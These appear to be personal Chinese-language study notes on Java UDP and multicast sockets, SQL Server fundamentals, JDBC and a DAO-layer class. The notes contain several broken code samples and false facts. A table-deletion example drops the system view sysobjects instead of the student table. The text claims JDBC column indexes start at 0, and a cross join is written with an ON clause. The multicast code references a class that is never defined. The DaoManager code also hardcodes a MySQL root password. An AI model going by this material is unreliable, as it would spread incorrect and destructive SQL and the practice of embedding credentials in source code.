UDP协议使用示例：  

`UDP`一端：  
>
	import java.net.*;
	import java.io.*; 
	public class UDPBTest
	{
		final static int Server_PORT=30000;
		public static void main(String[] args) 
		{
			try
			{
				//construct client's DatagramSocket without specific port
				DatagramSocket dgs = new DatagramSocket();
				BufferedReader br = new BufferedReader(new InputStreamReader(System.in));
				String content = null;
				while((content=br.readLine())!=null)
				{
					InetAddress iaa = InetAddress.getByAddress(new byte[]{10,23,94,(byte)253});
					//construct a DatagramPacket, it is aimed at storing the data which will be transmitted by DatagramSocket,with server's address and port.
					//the DatagramPacket should has the address and the port it aimed at
					DatagramPacket dgp = new DatagramPacket(content.getBytes(),content.length(),iaa,Server_PORT); 
					//send the data
					dgs.send(dgp); 
				}
			}
			catch(Exception e)
			{
				System.out.println("error");
			}
		}
	}

`UDP`另一端：  
>
	import java.net.*;
	public class UDPATest
	{
		final static int MAX_SIZE=102400;
		final static int PORT=30000;
		public static void main(String[] args) 
		{
			try
			{
				//construct a DatagramSocket with specific port
				DatagramSocket dgs = new DatagramSocket(PORT);
				while(true)
				{
					//construct a DatagramPacket, it is aimed at storing the data which get by DatagramSocket
					DatagramPacket dgp = new DatagramPacket(new byte[MAX_SIZE],MAX_SIZE);
					//store the data into the DatagramPacket
					dgs.receive(dgp); 
					System.out.println(new String(dgp.getData(),0,dgp.getLength()));
				}
			}
			catch(Exception e)
			{
				System.out.println("error");
			}
		}
	}



在使用`TCP`协议建立聊天程序的时候，需要建立一个服务器，将所有的内容进行转发到相应的客户端。  
但是在使用`UDP`协议建立聊天程序的时候，无需建立服务器，可以二者直接聊天。  


MuleticastSocket类：也是一个UDP协议，也是一个"码头",使用的时候也是需要与数据集装箱"DatagramPacket"联合使用。  
这是一个广播Socket，无需服务器。先设立一个特殊的IP地址(广播地址)，任何一个客户端向这个特殊的IP地址发送数据后，这个数据会被自动广播到所有加入了该IP地址的客户端。  
该类的方法setTimeToLive(int ttl):  

发送：  
与DatagramSocket类的使用方式是一样的，只是数据报地址是一个特殊的IP地址（广播地址）。  

接收：  
1. 要先调用joinGroup()方法加入这个广播地址。
2. 然后才能接收广播数据。

广播发送、接收使用示例：  
>
	import java.net.*;
	import java.io.*; 
	public class MultiBroadCastTest
	{
		//the default port
		final static int MULTI_PORT=30000;
		//the default IP address
		final static String CAST_IP="230.0.0.1";
		final static int MAX_SIZE=102400;
		public static void main(String[] args) throws Exception
		{
			new Thread(new SendThread()).start();
			new Thread(new RecieveThread()).start();
		}
	}
>	
	//the send thread
	class SendThread implements Runnable
	{
		public void run()
		{
			try
			{ 	
				//construct a multicastsocket
				MulticastSocket socket = new MulticastSocket();
				socket.setTimeToLive(1);
				InetAddress iaa = InetAddress.getByName(MulticastSocketSendTest.CAST_IP) ;
				BufferedReader br = new BufferedReader(new InputStreamReader(System.in));
				String content = null;
				while((content=br.readLine())!=null)
				{
					//construct a DatagramPacket, it is aimed at storing the data which will be transmitted by DatagramSocket,with server's address and port.
					DatagramPacket dgp = new DatagramPacket(content.getBytes(),content.getBytes().length,iaa,MulticastSocketSendTest.MULTI_PORT); 
					//send the data
					socket.send(dgp); 
				}
			} 
			catch(Exception e)
			{
				e.printStackTrace();
			}
		}
	}
>	
	//the receive thread
	class RecieveThread implements Runnable
	{
		public void run()
		{
			try
			{ 
				//construct a multicastsocket
				MulticastSocket socket = new MulticastSocket(MulticastSocketSendTest.MULTI_PORT);
				InetAddress iaa = InetAddress.getByName(MulticastSocketSendTest.CAST_IP) ;
				socket.setTimeToLive(1);
				socket.joinGroup(iaa);
				while(true)
				{
					//construct a DatagramPacket, it is aimed at storing the data which get by DatagramSocket
					DatagramPacket dgp = new DatagramPacket(new byte[MulticastSocketSendTest.MAX_SIZE],MulticastSocketSendTest.MAX_SIZE);
					//store the data into the DatagramPacket
					socket.receive(dgp); 
					System.out.println(new String(dgp.getData(),0,dgp.getLength()));
				}
			} 
			catch(Exception e)
			{
				e.printStackTrace();
			}
		}
	}
TTL:控制要被发送的数据报可以跨过多少网段。
TTL=0：该数据报只能停留在本机。 
TTL=1：该数据报只能停留在当前的局域网中。  
TTL=32：该数据报只能停留在本站点的网络中。  
TTL=64：该数据报只能停留在本地区。  
TTL=128：该数据报只能停留在本大洲。  
TTL=255：这是最大的，该数据报能到达全世界。
 

注：无论是在UDP通信还是MulticastSocket广播通信，发送端的Socket对象都无需设置IP地址与Port端口；接收端的Socket对象必须设置接收Port端口。发送端的Packet对象需要设置目的IP地址与端口Port，接收端的Packer对象无需设置Port接口或者IP地址。




#数据库中的数据库相关
-----
## 基础知识 ##
`C/S`：所有的`app`与应用程序都是`C/S`架构  
`B/S`：我们登陆的所有网站都是`B/S`架构  

应用程序与数据库之间的关系：  
1. 应用程序响应人的操作，向数据库发出请求。显示数据库返回的数据。  
2. 数据库响应应用程序的操作，向应用程序返回相应的数据结果。  

编写应用程序的目的：*处理*从数据库中返回的数据。

什么叫做关系型数据库：就是数据库中的表之间，通过*键的形式予以连接*，例如，*学生基本信息表*中的*学生编号是主键*，在*学生考试成绩表*中，*学生编号是外键*。这两张表通过学生编号这个键予以连接，这就是关系数据库的特征。这样两张表就能够联接查询、操作。  

`DB`：`DataBase`：数据库，本质上就是存储在磁盘上的各种格式的数据文件。  
`DBMS`：`DataBase Management System`：数据管理系统。用于管理数据库。  
`DBA`：`DataBase Administrators`：数据库管理员。软件公司没有数据库管理员，只有使用软件的企业里采用数据库管理员。工作是数据控制、管理、备份等。

## 数据库软件中的数据库 ##
###系统数据库
在数据库软件安装完成之后，就会有几个**系统数据库**。  
**系统数据库**的作用就是：管理我们自己创建的用户数据库。当我们在数据库中储存自己的数据，我们自己创建的这些数据库(**用户数据库**)需要被**系统数据库**管理与控制。系统数据库不能删除不能修改。  
例如：在SQLServer数据库软件中  
有一个系统数据库：Master，作用是统计、记录我们自己创建的用户数据库的情况。  
有一个系统数据库：Modal，作用是作为一个*数据库模板*，供我们自己创建用户数据库时使用。  
还有系统数据库：msdb与tempdb数据库。

###用户数据库  
当我们做一个项目的时候，会针对这个项目做一个数据库，为这个项目提供数据的存储、操作等。这个就是**用户数据库**。 
 
一个用户数据库中有两种文件：数据文件与日志文件  
1. 数据文件：  
 a. 主数据文件(.mdf):有且仅有一个。主数据文件中存放了次数据文件和日志文件这些东西的信息。  
 b. 次数据文件(.ndf):0个或多个。  
2. 日志文件(.ldf):0个或多个。 

为一个项目新建一个数据库。  
a. 图形界面创建  
b. 语句创建，创建数据库、表的时候，一定要使用`master`数据库。  
命令语句创建数据库  
"--"是单行注释，不区分大小写。  
数据库命令行语法可以去查文档。
>
	use master
	--create a database
	create database student
	--delete a database
	drop database student

注意：在`SQL`语言中，往往不能以语句位置来确定语句的执行顺序。只能以`begin……end`来代替其他语言中的`{}`来确定语句的执行顺序。  
示例如下：
>
	if exists(select * from database student)--exit方法的返回值是true或者false，它的参数是一条select语句，如果语句执行结果有记录就是true，如果select语句执行结果为空就为false。
	  print("yes)--在这里，如果是true的话，两个语句都可以执行，但是如果是false，第一个语句不执行，第二个语句不是和第一个语句一起被控制的，它还是会执行。
	  drop database student--因为，在这里，if这个判断只能控制print这个句子，而不能控制drop这个句子，无论如何，drop这个句子都会执行。
	else
	  print("no")
>
所以，这里如果想让这两个句子一起都被`if`判断所控制，只能使用`begin……end`来让他们连在一起。
>
	if exists(select * from database student)
	begin  
	  print("yes)--在这里，使用了begin……end将这两个语句连在一起，使他们一起被if判断所控制
	  drop database student
	end
	else
	  print("no")

##数据库备份
1. 使用分离与附加。这种拷贝方法不能压缩数据库。  
2. 直接备份，可以压缩数据库。备份可用于还原


#数据库中的表相关
------
更精确来讲，数据库中的数据是存储在`表`里面。  
在一张表中，如果我们需要什么信息，就在这个表里面增加一列(也就是增加一个新字段)。

##字段约束  
对于某些字段，对这个字段的值是有限定的，如果我们输入了错误(无效)的字段值，则称为：此表失去了完整性。

那么怎样保证字段的值有效？  
`Answer`：对字段施行*完整性约束*。  
约束有以下几种：  
1. 唯一性约束，如学号字段，其允许一行数据为空。但必须唯一。  
2. 主键约束，相当于:唯一约束+非空约束。要求这个字段中的数据唯一且有值。可以给两列加主键约束，称为复合主键，但是比较少。  
3. `check`约束，值范围有约束。  
4. 默认值约束，如果没有值就会给一个默认值。  
5. 主外键约束，就是，我们一个表中的某个字段的值必须来自于另外一个表中的某一个字段的值，否则就不对，这就是主外键约束。而且这可以是一对多的关系：主键表中的主键字段中的一个值可以在外键表中的该字段中出现多次。  
例如，一张是教师表，另一张是学生表。对于教师名字这个字段而言，教师表是主键表，学生表是外键表，其中，每一个教师名字都可以在学生表中的教师名字字段出现多次(多个学生工一个老师)。

当我们建立两个表，第二个表中某一个字段的所有值都是来自于第一个表中的某个字段的值，那么，称第一个表为主键表，第二个表为外键表。相对与一个字段，该表可以是主键表，但是相对于另外一个字段，该表可以是外键表。

什么叫做约束？  
`Answer`：就是对数据库表中的**字段的值进行的限制**。约束的作用就是：保证我们在输入字段的值的时候不会输入错误的值。自动检查我们输入的值是否符合要求。


##建表
>
	--创建表
	create table student
	(
		--字段名       数据类型         约束(一般在建立一个表的时候只添加非空约束，以后再添加其他的约束)
		 stuName      varchar(20)     not null，
		 stuId    	    int           not null，
	)
	create table score
	(
		 stuId          int			  not mull，
	)
	--删除表
	drop table student


建表是依据数据字典建立的，所谓的数据字典就是：一张表中，所有的数据的要求信息，包括各个字段的名称、类型等的规定。

##修改表中的字段约束
>
	alter table student
	-- add constraint   约束名       约束类型        具体约束说明 
	   add constraint   PK_stuId    primary key    (stuId)     --为stuId这个字段添加主键约束。
	alter table student
	   add constraint   PK_stuName   UNIQUE         (stuName)   --为stuName这个字段添加唯一约束。
	alter table student
	   drop constraint  PK_stuName  --删除PK_stuName这个约束
	alter table score  --添加外键约束的时候要使用外键表
	-- add constraint   约束名       约束类型    外键表字段    REFERENCES    主键表  主键表字段
	   add constraint   FK_stuId    Foreign key(stuId)      REFERENCES    student(stuId) --为外键表的stuId这个字段添加外键约束



注：可以将所有要运行的`SQL`命令行语句放在一个`.sql`后缀的脚本文件中，然后写一个`.bat`批处理脚本，在`bat`批处理脚本中调用`osql`工具来运行这个`.sql`后缀的脚本文件，就可以不用打开`SQL`数据库软件而直接运行这些`sql`命令行。`sql`脚本里面就是我们需要执行的`sql`语句。

怎样删除一张表？  
>
	if exist(select * from sysobjects where name="student")--删除student表，sysobjects是一个对象视图，每一个数据库中都有一个，记录的是这个数据库中的详细信息，如，我们自己建立的每一个用户数据库中都有一个sysobjects对象视图，里面包含了这个数据库中所有的字段、约束等信息。
	   drop table sysobjects;

##数据库管理界面(GUI)使用
注：
1. 将某一个字段设为标识列：是将某一列作为标识。就是将这一列的值设置为自增加，需要先将这个字段设置为`primary key`，然后才能设置为`auto increment`。标识列可以不用编辑，自己会增加。  
2. 想一个外键表中添加外键字段的值的时候，必须保证在主键表中相同字段中有同样的值才能保证添加成功。

##对数据库中数据的操作
1. 增  
2. 删  
3. 改  
4. 查

`SQL`：`Structured Query Language`，任何数据库都要遵循这样的`SQL`规范。  
`T-SQL`:`SQL`的加强版。里面有些内容不是标准`SQL`。  
T-SQL的组成：  
1. DDL(数据定义语言)：用于建立数据库、表、视图等数据库对象。如，create table、drop table等。  
2. DML(数据操作语言)：用于增、删、改、查的数据库中的数据。如，select(查)、insert(增)、update(改)、delete(删)。  
3. DCL(数据控制语言):用于控制存取许可、存取权限等，如，grant、revoke等。  

注：SQL总不等于的写法：“<>”。
###数据插入
>
	insert    into     表名       (列名)                                        values(要插入的值);        --字符串需要加''。插入数据最重要的是匹配。
	insert    into    student    (stu_Id,stu_Name,stu_Age,stu_Ger,teachId)     values(4,'wt',30,1,22);   --向表student中插入单行数据
>
	insert     into     表名1       要被插入的字段      数据来源 
	insert     into    student1                   select * from student;   --将表student中的数据备份插入到表student1中,但是备份并没有备份表约束，只备份了数据与表结构
>
	insert     into    student2   (stu_Id, stu_Name,stu_Age,stu_Ger)      select stu_Id, stu_Name,stu_Age,stu_Ger from student;    --将student表中中某几个字段的数据插入到表student2中

###数据查询
####基础查询
>
	 --select     需要显示的字段		  查找数据来源		查找条件
	   select 		 * 			     from student 		where  stu_Age>33;--精确查询，大于33岁的条目
	   select 	  stu_Id,stu_Name 	 from student 		where  address like '北京%';--使用like进行模糊查询，使用了通配符 
	   select        *               from country       where Code like "A%";--查找带有A的字符串
	   select top 10 percent * from student;--查询前10%
	   select * from student order by stu_Age;--查询结果按学生年龄升序排列，默认升序，desc是降序。
查找所用通配符：
"_"：一个字符  
"%"：任意长度的字符串  
"[]"：括号内指定范围内的一个字符  
"[^]"：括号内指定范围之外的一个字符

可以利用as关键字给字段名等取别名。

####聚合函数  
所谓的聚合函数，就是指的一些统计函数。
>	
	--统计
	select avg(stu_Age) as avga, sum(stu_Age) as suma, max(stu_Age) as maxa, min(stu_Age) as mina,count(stu_Age) as counta from student;
	--group by分组
	--having：对已用聚合函数进行分组的结果进行删选(与group by合用)。where：对表中的原始数据进行删选。
	select group_Id,avg(stu_Age) from student group by group_Id having avg(stu_Age)>=30;
	
####联接查询
当我们需要在不同的表中查询一个主体的数据，显示在同一张表中，那么就需要使用联接查询。  
a. 内联接：显示外键表所有数据，并显示主键表与之对应的数据。
>
	select t.teachId,t.teaName,s.stu_Name from teacher as t inner join student as s on(t.teachId=s.teachId);

b. 外联接：分为左外联接与右外联接。  
左外联接：  
1. 先显示内联接的所有数据。  
2. 然后看左表中是否有没匹配的没有的话原栏列出，右表部分用`null`补齐。
>
	select * from teacher as t left join student as s on(t.teachId=s.teachId);

右外联接：  
1. 先显示内联接的所有数据。  
2. 然后看右表中是否有没匹配的没有的话原栏列出，左表部分用`null`补齐。
>
	select * from teacher as t right join student as s on(t.teachId=s.teachId);

注意：前面的是左表，后面的是右表。

c. 交叉联接：
>
	select * from teacher as t cross join student as s on(t.teachId=s.teachId);

内联接中的所有条目都要与外联接中所有条目进行交叉匹配，所以获得的交叉联接结果条目数是内联接结果条目数与外联接结果条目数的积。

####子查询
T-SQL编程中，变量有两种，局部变量与全局变量。
局部变量：
	--声明局部变量，以@开头，可读写。
	declare @age int；//定义
	set @age=10；//赋值
	select @age as	'年龄'；//设置列名
	print @age；  
全局变量：
	--系统声明赋值的，我们只能使用。只读，以@@开头。

所谓的子查询：将一个查询的结果作为另一个查询的数据源。
###数据修改
>
	 --update      表名          修改操作                    被修改条件
	   update     student      set stu_Age=stu_Age+10      where stu_Name like '[A Z]e';
###数据删除
>
	 --delete      删除操作数据源        删除条件
	   delete      from student       where stu_Id=2;--删除stu_Id=2的数据行
	   truncate    table student       --删除整张表里的数据

注：  
1. 在外键表中插入数据的时候，要考虑外键字段中插入的数据在主键字段中已经存在。  
2. 在主键表中删除数据的时候，要保证主键字段中要被删除的数据在外键表相应字段中没有被引用，否则不能被删掉。这样把主外键删掉会导致问题，因为关系数据库中的表都是连接起来如一张网一样。

`SQL`语句支持嵌套。

###`T-SQL`中的常用函数  
`T-SQL`中的**字符串函数**  
(注：仅在SQL server中才有，其它数据库中不与之同名):用于对字符串进行操作。
	select charindex("am","I am a boy",1);--查找已知字符串的位置
	select len(stu_Name) as length stu_Id from student ;--计算姓名字符串的长度
	select getdate();--返回当前时间

`T-SQL`中的**数学函数**  

`T-SQL`中的**系统函数**  
	select convert(varchar(2),stu_Age)--将年龄转换为varchar类型


##SQL中的视图
###视图的定义
视图是一张虚拟表，其表示的是一张表的部分数据或者多张表的综合数据，其结构和数据是建立在对原始表的查询基础上的。  
视图中并不存在数据，数据是存放在视图所引用的原始表（基表）中。  
同一张原始表，更具不同用户的不同需求(查询)，可以创建不同的视图。  
###视图的作用
当我们只想给数据库的用户查询功能的时候，就不能向用户暴露出数据表的字段结构，因为这样容易被用户篡改数据。  
所以，我们都是将一个查询做成一个视图，这样，用户在`Java`代码中直接使用了这个视图进行查询，而不用知道这个数据表中的字段。这样就保证了隔离安全。  
同时也简化了`Java`代码中进行数据查询的代码量。降低复杂度。还可以将多个数据表联立查询作为一个视图，更加方便。
还可以将多个物理数据库的联立查询创建为一个视图。

在数据库中创建视图示例如下：
>
	create view trio
	select studentId studentName from student;

以上就是建立了一个查询的视图。
在`Java`代码中使用的时候如下：
>
	select * from trio;

这样即使用`trio`视图进行了一次查询。而不必知道`student`数据表中的数据字段。保证安全、方便。  
也就是说，数据库的管理者让你查什么你就能查什么。一个视图实际上就是数据库管理者事先设定好的查询的结果。只不过这个结果是随数据库实际情形而改变的，查询条件并不会改变，但是查询结果会发生改变。  
注意：视图的作用只能是查询，增加、删除、修改都不能使用。
##SQL中的事务
由上可知，可以使用视图来使查询更安全而方便，但是其他的三种操作并不能使用视图，所以，可以使用事务进行其他的三种操作。  
###事务的定义：  
可以在执行多个`insert、update、dalet`e语句时使用。  
事务(`transcation`)：是作为*单个*逻辑工作单元执行的*一系列*操作，这些操作*作为一个整体一起向系统提交，要么都执行，要么都不执行*。  
事务是一个不可分割开的单元。
###事务的特点：
原子性：事务是一个完整的操作，其中的各步操作不可分(要么全部执行，要么全部不执行)。
一致性：当事务完成时，数据必须处于一致状态。各个数据必须都被操作了。
隔离性：各个事务之间是相互隔离的，表明事务是独立的，不会影响其他事务。  
永久性：事务完成之后，其对数据库的修改被永久保存，事务日志能够保持事务的永久性。

###事务的使用：
####在Java中使用事务
如，当我们在`Java`编程中，要**依次**使用`statement`对象去执行两条`update`语句，那么在依次执行过程中，如果第二条发生故障，那么第一条依旧是已经执行完成了，而第二条未完成。假如我们希望两条语句要么全部执行，要么全部不执行，此时就可以使用事务，进行事务回滚。在故障发生的时候，对已经执行的语句进行事务回滚。  
对于`Connection`对象`conn`而言：  
如果其`AutoCommit`属性是`true`，那么就会是自动提交事务，也就是说`jdbc`会将每一个`SQL`语句视为一个单独的事务，对各自进行自动提交。  
如果价格其`AutoCommit`属性设置为`false`，就会设置为手动提交事务，需要手动提交，将手动提交方法`commit()`方法前的所有`SQL`语句视为一整个事务进行提交执行。这就是使用事务的目的。也就是说，无异常则调用`commit()`，有异常则调用`rollback()`。
事务使用示例：
>
	try
	{
		conn=DriverManager.getConnection("……")；//获得Connection对象。
		conn.setAutoCommit(false);//conn的默认AutoCommit属性是true，也就是说不会进行回滚。会将所有SQL语句视为单独的事务。所以要将自动提交属性先设置为false。  
		stat=conn.createStatement();//获得statement语句
		sta.execUpdate(sql1);
		sta.execUpdate(sql2);
		conn.commit();//此处进行手动提交，将前面的两条SQL语句视为一个事务。如果没有异常，就执行这里的commit，如果有异常，那就执行下面的回滚。
	}
	catch(Exception e)
	{
		conn.rollback();//一旦出现异常，即进行事务回滚，取消已经执行的SQL语句的结果，回滚到原始状态。
		e.printStackTrace();
	}

以上即是事务及回滚的使用。  
注意：此处的事务回滚，只针对一条`conn`连接才可以。如果是有多条`conn`，也就是多个进程都进行操作就不能以此实现回滚了，那必须借助框架或者容器，使用`JTA(java transaction api)`才可以实现。

####在数据库中使用事务
使用`BEGIN TRANSACTION,COMMIT TRANSACTION,ROLLBACK TRANSACTION`关键字即可。  
数据库中很少使用事务。一般都在`Java`代码中使用。

##SQL中的索引
就相当于书前面的目录，可以更快地查找到想要的内容，索引是为查询服务的。  
在数据库的表中，数据实际存储是按照页存放的，一般是4Kb为一页数据，然后查询的时候就可以依据要查找数据的索引找到这个数据所在的页，就好像字典里可以依据字的拼音(就是一种索引)找到这个字所在的页码。  
在数据库中，有一个索引页，这个索引页里面放置的都是各个数据所在页的地址，类似与字典前面的目录页，放置的是各个字所在的页码地址。可以查找目录页获得这个字所在地址，再循地址找到这个字。  
通过索引，可以提高数据库检索速度。  

索引的类型：  
唯一索引：不允许两行具有相同的索引值。  
主键索引：当将一个字段定义为主键，即自动将其作为主键索引，主键索引是唯一索引的的特殊类型，主键索引中每一个值都是唯一且不为空的。  
聚集索引：表中各行的物理顺序与键值的逻辑顺序相同。每个表中只有一个。  
非聚集索引：每个表中可以有多个。  

建索引使用示例：
>
	create nonclustered index IX_name on student(stu_Name) with fillfactor=30;//建非聚集索引。那么在查询的时候，就用stu_Name这个关键字作为索引页建立依据。
>
	select * from student with(index=IX_name) where stu_Name="wt";//在查询的时候，指定使用stu_Name作为索引进行查询。

优缺点：
1. 没有使用索引，也可以查询，但是使用了查询速度会提高。  
2. 带索引的表在数据库中占更多的存储空间，因为还有索引页需要存储。  
3. 操纵修改数据的命令需要更多的时间进行处理，因为索引页也需要修改。

建立索引的原则：  
1. 该列用于频繁搜索  
2. 该列用于对数据进行排序  
3. 但列中的值的重复性高，就不要对其加索引  
4. 当数据表过短不必建立索引

##SQL中的存储过程
过程：就是方法、函数。
存储过程类似与C语言中的*函数*，用于管理任务或应用复杂业务规则，存储过程可以带参数，也可以返回结果，可以包含数据操纵语句、变量、逻辑、控制语句。  
以前业界常将其作为衡量程序员水平的标准。但是现在作为`Java`程序员，此功能被弱化，因为`Java`程序讲究的是与具体的数据库的分离。但是`.net`平台依旧很看重存储过程的时候。
当我们在编程中使用`SQL`语言进行数据库交互的时候，要将程序中`SQ`L语句传递给数据库，让数据库进行处理，效率低。  
所以，我们可以将这些`SQL`语句写在数据库中，构成一个`SQL`过程，在编程代码中，直接调用这个过程，向该过程传递`SQL`操作所需要的参数，即可。这样效率提高了。  
可以使用`T-SQL`编程，使用`if、where`等这些逻辑控制语句。

###存储过程的使用示例：  
数据库中创建转账的存储过程：
>
	create procedure zhuanzhang
		@inId int,//参数列表
		@outId int,
		@money int,//此三者是作为输入参数
		@inMoney int output,
		@outMoney int output//output关键字表明此二参数是作为输出参数的
	as
		update bank set currentMoney = currentMoney +@money where cid = @inId
		update bank set currentMoney = currentMoney -@money where cid = @outId
		select @inMoney = currentMoney from bank where cid = @inId
		select @outMoney = currentMoney from bank where cid = @outId//这里可以使用T-SQL编程，可以用流程控制等语句。

在`Java`代码中调用存储过程使用示例：
>
	try
	{
		int outId=1;
		int inId=2;
		int money=100;//此三者为输入值
		Class.forName(driver);
		conn = DriverManager.getConnection(url, user, password);
>
		CallableStatement csts=conn.prepareCall("{call zhuanzhang(?,?,?,？,?)}");//调用存储过程
>
		csts.setInt(1,inId);
		csts.setInt(2,outId);
		csts.setInt(3,money);//此三者设置输入
>
		csts.registerOutParameter(4,Types.INTEGER);
		csts.registerOutParameter(5,Types.INTEGER);//此二者设置输出
>	
		csts.execute();//执行存储过程
		int out1 = csts.getInt(4);
		int out2 = csts.getInt(5);//获得存储方法的返回值
	}

###存储过程的优势
提高速度。效率更高。  
但为什么`Java`中不推荐使用存储过程？  
`Answer`:因为在`Java`中，提倡将代码与数据库进行分离，也就是说，希望同一个代码可以适用于不同的数据库。而使用存储过程后，就需要针对不同的数据库写不同的存储过程，不适用于与`Java`的特点。

##SQL中的触发器
触发器(`trigger`)是在对表进行插入、修改、删除操作时**自动执行**的存储过程，其实质上是一种特殊的存储过程。  
前面而言的一般的存储过程需要在`Java`源代码中**手动调用执行**。  
实际中触发器用得很少。  
触发器的使用，例如，银行某账户取钱之后，会在*交易信息表*中添加一项，随之也需要在*账户信息*表中添加一项。这两个`SQL`语句可以合成一个事务进行处理。也可以使用触发器，当交易信息表发生改变之后，*不用手动*去账户信息表中执行相应`SQL`语句，而是利用触发器，让账户信息表中的`SQL`语句自动执行。也就是说，我们只用手动操作一张表，另一张表的操作会自动执行。  
再例如，在员工信息表中加上触发器之后，在退休员工表中添加几项的时候，就会自动在员工表中减去几项，这就是触发器的功能。  
触发器具有事务的功能，能够在多表之间执行特殊的业务规则。  
触发器种类：  
`delete`触发器、`insert`触发器、`update`触发器。  
`inserted`表与`deleted`表：  
当触发器触发的时候，系统会自动在内存中创建`deleted`表或者`inserted`表，这两张表只读，不允许修改，在触发器执行完成之后，自动删除。  
`inserted`表：用于临时保存插入或更新后的记录行。  
`deleted`表：用于临时保存删除或更新前的记录行。  
这两个表的记录作用是：用于回滚。


#Java中的JDBC
`JDBC`：`Java DataBase Connection`。实际上就是`Java`应用程序连接数据库的规范，具体的实现就是：类与接口的集合。这个规范是`Java`原公司制作的。
`ODBC`：在之前都是使用`ODBC`来作为连接应用程序与数据库之间的标准规范。  

##使用JDBC的步骤：
1. 将`JDBC`驱动程序的`Jar`包放入我们的程序目录下面，并加入路径。  
2. 加载类，注册类。  
3. 创建`Connection`对象。相当于`Java`程序与数据库之间的路径。  
4. 创建`Statement`对象，相当于获得运输数据的车。  
5. 使用`Statement`对象执行`sql`语句。通过`execuUpdate()`方法来对数据进行更新，包括增、删、改操作。  
   使用`executeQuery()`方法进行数据的查询，得到`ResultSet`对象，该对象就是查询数据库后获得的数据集合的封装。通过该对象的方法`getString()`取得各段结果。`getString()`方法的参数可以是列名或者下标(注意，在`JDBC`中，下标从0开始)，下标更快。  
6. 关闭释放资源。

##桥连与直连
以上的`JDBC`就是所谓的**直连**，也就是说，当一个数据库实现了`JDBC`规范，那么就可以直接通过相应的`API`来连接数据库。但是，如果某些数据库(如、微软单机数据库`Access`)没有实现`JDBC`规范，而是实现了`ODBC`规范。那么就不能进行直连了。  
桥连：`Java`中提供了`JDBC-ODBC`桥，这样就可以通过`JDBC`连接`ODBC`，然后再通过`ODBC`连接至数据库。这就是所谓的桥连。只有`Access`才用桥连，其他都用直连。


#Java中的DAO层
----
按照软件的三层架构，分为表示层、业务层、持久层。(见图：`SoftWare_Structure.png`)  
其中的持久层负责处理软件用户的要求，如：运算，从数据库中存、取数据等功能。所以持久层也叫数据存取层也就是`DAO`层。  
一般而言，有几张表就有几个`DAO`类。
那么，怎样写`DAO`层？  
`DAO`层实际上就是一个类，这个类里面提供了对该`DAO`层所对应的表的增、删、改、查操作的所有方法。  
一个`DAO`层的类原型如下：  
>
	public class StudentDao
	{
		public void add() 
		{
	
		}
	
		public void delete()
		{
	
		}
	
		public void update()
		{
	
		}
	
		public void find() throws SQLException
		{
			
		}
	}

这个类就是一个`DAO`层，对应与`student`表，作用是：操作`student`表中的数据(增、删、改、查)。

如下即是一个针对`student`表的`DAO`层的具体实现： 

1.0版本：  
a. `DAO`层接口代码：
>
	package com.trilever.DAO;
	import java.sql.*;
	import com.trilever.DAOManager.*;
	public class StudentDao
	{
		public void add() throws SQLException
		{
			String sql = "insert into student (stu_Id,stu_Name,stu_Age,stu_Ger,teachId,group_Id) values(7,'wsdf',35,0,22,2)";
			DaoManager fdm = new DaoManager();
			int row = fdm.insertManager(sql);
			System.out.println(row);
		}
>	
		public void delete() throws SQLException
		{
			String sql = "delete from student where stu_Id=7";
			DaoManager fdm = new DaoManager();
			int row = fdm.deleteManager(sql);
			System.out.println(row);
		}
>	
		public void update() throws SQLException
		{
			String sql = "update student set stu_Age=stu_Age+10 where stu_Name like \"[a z]\" ";
			DaoManager fdm = new DaoManager();
			int row = fdm.updateManager(sql);
			System.out.println(row);
		}
>	
		public void find() throws SQLException
		{
			String sql = "select stu_Id,stu_Name,stu_Age from student";
			DaoManager fdm = new DaoManager();
			ResultSet mk = fdm.findManager(sql);
			while (mk.next())
			{
				System.out.print(mk.getString("stu_Id") + " ");
				System.out.print(mk.getString("stu_Name") + " ");
				System.out.println(mk.getString("stu_Age"));
			}
			//对于查询而言，不能再使用结果集之前就关闭了结果集，所以要在DaoManager类中增加一个closeFunc()方法，以用于在使用了结果集ResultSet之后再关闭它
			fdm.closeFunc();
		}
	}

b. `DAO`层具体实现代码：
>
	package com.trilever.DAOManager;
	import java.sql.Connection;
	import java.sql.DriverManager;
	import java.sql.ResultSet;
	import java.sql.SQLException;
	import java.sql.Statement;
	public class DaoManager
	{
		private Connection conn = null;
		private Statement stat = null;
		private ResultSet rs = null;
		private String driver = "com.mysql.jdbc.Driver";
		private String url = "jdbc:mysql://localhost:3306/class";
		private String user = "root";
		private String password = "wt312041990";
		private int row = 0;
		public ResultSet findManager(String sql) throws SQLException
		{
			try
			{
				// 装载、注册类
				Class.forName(driver);
				// 修建Java应用程序与数据库之间连接的路径
				conn = DriverManager.getConnection(url, user, password);
				if (!conn.isClosed())
				{
					System.out.println("connects succees!");
				}
				// 创建用于数据运输的车
				stat = conn.createStatement();
				// 执行sql查询语句
				rs = stat.executeQuery(sql);
			} catch (ClassNotFoundException e)
			{
				e.printStackTrace();
				System.out.println("包没有找到");
			}
			return rs;
		}
>		
		public int  insertManager(String sql) throws SQLException
		{
			try
			{
				// 装载、注册类
				Class.forName(driver);
				// 修建Java应用程序与数据库之间连接的路径
				conn = DriverManager.getConnection(url, user, password);
				if (!conn.isClosed())
				{
					System.out.println("connects succees!");
				}
				// 创建用于数据运输的车
				stat = conn.createStatement();
				// 执行sql查询语句
				row = stat.executeUpdate(sql);
			} catch (ClassNotFoundException e)
			{
				e.printStackTrace();
				System.out.println("包没有找到");
			}
			finally
			{
				this.closeFunc();
			}
			return row;
		}
>	
		public int deleteManager(String sql) throws SQLException
		{
			try
			{
				// 装载、注册类
				Class.forName(driver);
				// 修建Java应用程序与数据库之间连接的路径
				conn = DriverManager.getConnection(url, user, password);
				if (!conn.isClosed())
				{
					System.out.println("connects succees!");
				}
				// 创建用于数据运输的车
				stat = conn.createStatement();
				// 执行sql查询语句
				row = stat.executeUpdate(sql);
			} catch (ClassNotFoundException e)
			{
				e.printStackTrace();
				System.out.println("包没有找到");
			}
			finally
			{
				this.closeFunc();
			}
			return row;
		}
>		
		public int updateManager(String sql) throws SQLException
		{
			try
			{
				// 装载、注册类
				Class.forName(driver);
				// 修建Java应用程序与数据库之间连接的路径
				conn = DriverManager.getConnection(url, user, password);
				if (!conn.isClosed())
				{
					System.out.println("connects succees!");
				}
				// 创建用于数据运输的车
				stat = conn.createStatement();
				// 执行sql查询语句
				row = stat.executeUpdate(sql);
			} catch (ClassNotFoundException e)
			{
				e.printStackTrace();
				System.out.println("包没有找到");
			}
			finally
			{
				this.closeFunc();
			}
			return row;
		}
